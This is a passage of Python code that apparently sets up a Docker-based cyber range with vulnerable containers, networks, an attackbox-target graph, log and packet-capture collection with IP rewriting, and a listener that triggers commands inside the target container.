                            no_connection = False
                
                if Container.name.lower() == "postgres":
                    try:
                        conn = psycopg2.connect(
                                host=Container.ipv4_addr,
                                database="test",
                                user="test",
                                password="ing")
                    except Exception as e:
                        if "authentication failed" in str(e):
                            no_connection = False


        if Container.svc_check != None:
            service_check(Container.svc_check)

        if len(on_running_cmds) >= 1:
            for cmd in on_running_cmds:

                cmd_create = api_client.exec_create(Container.name, cmd)
            
                cmd_execute = api_client.exec_start(cmd_create, detach=True)
        
    return "{} is up and running and can be accessed on {}:{}\n".format(Container.image,Container.ipv4_addr,Container.default_port)


def yaml_data_from_docker_compose(container):

    docker_compose_file = ""

    files = os.listdir("{}{}".format(vulnhub_dir,container))

    for f in files:
        if f.lower().__contains__("compose"):
            docker_compose_file = "{}/{}/{}".format(vulnhub_dir,container,f)

    with open(docker_compose_file) as dcf:
        dcf_data = yaml.safe_load(dcf)
    
    return dcf_data, docker_compose_file
        

def container_to_graph(scenario,graph_container,network):

    container_ip_str = ""

    if graph_container in scenario.assigned_containers and ipaddress.IPv4Address(scenario.assigned_containers[graph_container]) in ipaddress.ip_network(network):
        container_ip_str = "{}:{}".format(graph_container,scenario.assigned_containers[graph_container])

    else:
        if network == "172.18.0.0/24":
            scenario.current_external_ip = str(ipaddress.IPv4Address(scenario.current_external_ip) +1)
            ip_assignment = scenario.current_external_ip
        
        if network == "172.19.0.0/24":
            scenario.current_internal_ip = str(ipaddress.IPv4Address(scenario.current_internal_ip) +1)
            ip_assignment = scenario.current_internal_ip
        
        container_ip_str = "{}:{}".format(graph_container,scenario.current_external_ip)

        scenario.assigned_containers[graph_container] = ip_assignment
        
    scenario.connected_containers.append((scenario.targetos, container_ip_str))

    if network == "172.18.0.0/24":
        scenario.connected_containers.append((scenario.attackbox, container_ip_str))

    return container_ip_str


def network_create(req_network, network_subnets):

    count = 18
    
    while True:
        req_network_subnet = "172.{}.0.0/24".format(str(count))

        if req_network_subnet not in network_subnets:
            break
        else:
            count += 1

    ipam_pool = docker.types.IPAMPool(subnet=req_network_subnet)

    ipam_config = docker.types.IPAMConfig(pool_configs=[ipam_pool])

    api_client.create_network(req_network,ipam=ipam_config)

    print("{} network created - Subnet = {}".format(req_network,req_network_subnet))

    return req_network_subnet


def sub_network_check(req_network):

    network_list = api_client.networks()

    network_subnets = []

    req_network_subnet = ""

    req_network_exists = False

    for network in network_list:
        if network["Name"] == req_network:
            req_network_subnet = network["IPAM"]["Config"][0]["Subnet"]
            print("{} network found - Subnet = {}".format(req_network,req_network_subnet))
            req_network_exists = True
            break
        if len(network["IPAM"]["Config"]) > 0:
            for i in range(0,len(network["IPAM"]["Config"])):
                network_subnets.append(network["IPAM"]["Config"][i]["Subnet"])

    if not req_network_exists:
        req_network_subnet = network_create(req_network,network_subnets)

    network_subnets = []

    return req_network_subnet


def create_Network_Graph(connected_containers,container_nodes): 

    edge_input = connected_containers

    node_input = container_nodes

    G = nx.Graph()

    #edges = nx.read_edgelist(edge_input)

    G.add_edges_from(edge_input)
    G.add_nodes_from(node_input)

    pos = nx.layout.kamada_kawai_layout(G)

    edge_x = []
    edge_y = []
    for edge in G.edges():
        x0, y0 = pos[edge[0]]
        x1, y1 = pos[edge[1]]
        edge_x.append(x0)
        edge_x.append(x1)
        edge_x.append(None)
        edge_y.append(y0)
        edge_y.append(y1)
        edge_y.append(None)

    edge_trace = go.Scatter(
        x=edge_x, y=edge_y,
        line=dict(width=0.5, color='#888'),
        hoverinfo='none',
        mode='lines',
        showlegend=False)

    node_x = []
    node_y = []
    node_str = []
    for node in G.nodes():
        x, y = pos[node]
        node_x.append(x)
        node_y.append(y)
        node_str.append(str(node))

    node_trace = go.Scatter(
        x=node_x, y=node_y,
        mode='markers+text',
        hoverinfo='text',
        text=node_str,
        marker=dict(
            color="red",
            size=10,
            line_width=2))

    # node_adjacencies = []
    # node_text = []
    # for node, adjacencies in enumerate(G.adjacency()):
    #     node_adjacencies.append(len(adjacencies[1]))
    #     node_text.append('# of connections: '+str(len(adjacencies[1])))

    # node_trace.marker.color = node_adjacencies
    # node_trace.text = node_text

    fig = go.Figure(data=[edge_trace, node_trace],
                layout=go.Layout(
                title='Container Range Environment Setup',
                titlefont_size=16,
                showlegend=False,
                hovermode='closest',
                margin=dict(b=20,l=5,r=5,t=40),
                annotations=[ dict(
                    text="Connected containers indicate they have direct network access",
                    showarrow=False,
                    xref="paper", yref="paper",
                    x=0.005, y=-0.002 ) ],
                xaxis=dict(showgrid=False, zeroline=False, showticklabels=False),
                yaxis=dict(showgrid=False, zeroline=False, showticklabels=False))
                )

    fig.update_traces(textposition='top center', textfont_size=14, textfont_color="red")

    res = fig.to_html(full_html=False)

    return res


def log_clean_up(pcap_file_to_cleanup,container_logs_to_recover, suricata_log_dir, output_fldr):

    if not os.path.isdir(output_fldr):
        os.makedirs(output_fldr)

    with open("{}/{}".format(resource_file_path,pcap_file_to_cleanup), 'rb') as f:
        content = f.read()

    hex_str = binascii.hexlify(content).decode('ascii')

    rpl_hex_str = hex_str.replace("ac120001","ac12009d")

    file_str = binascii.unhexlify(rpl_hex_str)

    with open("{}/{}".format(output_fldr,pcap_file_to_cleanup), 'wb') as f:
        f.write(file_str)

    os.chown("{}/{}".format(output_fldr,pcap_file_to_cleanup),1001,1001)

    os.remove("{}/{}".format(resource_file_path,pcap_file_to_cleanup))

    for root, dirs, files in os.walk("{}/{}".format(resource_file_path,suricata_log_dir)):
        for file in [os.path.join(root, f) for f in files]:
            os.chown(file,1001,1001)
            os.chmod(file, stat.S_IRUSR | stat.S_IWUSR | stat.S_IRGRP | stat.S_IWGRP | stat.S_IROTH | stat.S_IWOTH)

            with open(file, 'r') as file_in :
                filedata = file_in.read()

            filedata = filedata.replace('"172.18.0.1"', '"172.18.0.157"')
            filedata = filedata.replace('172.18.0.1:', '172.18.0.157:')

            with open("{}/{}".format(output_fldr,os.path.basename(file)), 'w') as file_out:
                file_out.write(filedata)
            
            os.remove(file)

    containers_objects = docker_client.containers.list()
    running_containers = [x.name for x in containers_objects]

    for container in container_logs_to_recover:

        #if container in running_containers:

        bits, _ = api_client.get_archive(container, '/var/log/syslog')

        tar_f = open('{}/{}_logs.tar'.format(output_fldr,container), 'wb')

        for chunk in bits:
            tar_f.write(chunk)
        tar_f.close()
    
    # Need to fix this
    for container in running_containers:

        logdata = api_client.logs(container)

        with open('{}/{}_dockerlogs.log'.format(output_fldr,container), 'wb') as dockerlog_file:
            dockerlog_file.write(logdata)

    #TODO add in elasticdump commands here

    # Need to dynamically pull the filebeat indices and then we should be good to just parse as a docker command

    #docker run --rm -it --name=elasticdump --net=uwe_tek_external -v $(pwd):/tmp elasticdump/elasticsearch-dump --input=http://172.18.0.10:9200/filebeat-7.17.2-2022.08.22-000001 --output=/tmp/filebeat_mapping.json --type=mapping
    #docker run --rm -it --name=elasticdump --net=uwe_tek_external -v $(pwd):/tmp ^Casticdump/elasticsearch-dump --input=http://172.18.0.10:9200/filebeat-7.17.2-2022.08.22-000001 --output=/tmp/filebeat_analyzer.json --type=analyzer
    #docker run --rm -it --name=elasticdump --net=uwe_tek_external -v $(pwd):/tmp elasticdump/elasticsearch-dump --input=http://172.18.0.10:9200/filebeat-7.17.2-2022.08.22-000001 --output=/tmp/filebeat_data.json --type=data


    print("\Stopping logging - Output files saved in {} - Containers are still running".format(output_fldr))
	

def listen(ip,port,cmd,target_os):
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind((ip, port))
        s.listen(1)

        print("Listening on port {}".format(str(port)))
        conn, addr = s.accept()
        print("Connection received from {}".format(addr))

        os_shell = "bash"

        if target_os.__contains__("alpine"):
            os_shell = "ash"

        wrapper_cmd = 'docker exec -it target {} -c "{}"'.format(os_shell,cmd)
            
        subprocess.run(['gnome-terminal', '-x', 'bash', '-c', wrapper_cmd], stderr=subprocess.STDOUT, stdout=subprocess.PIPE)

        conn.close()
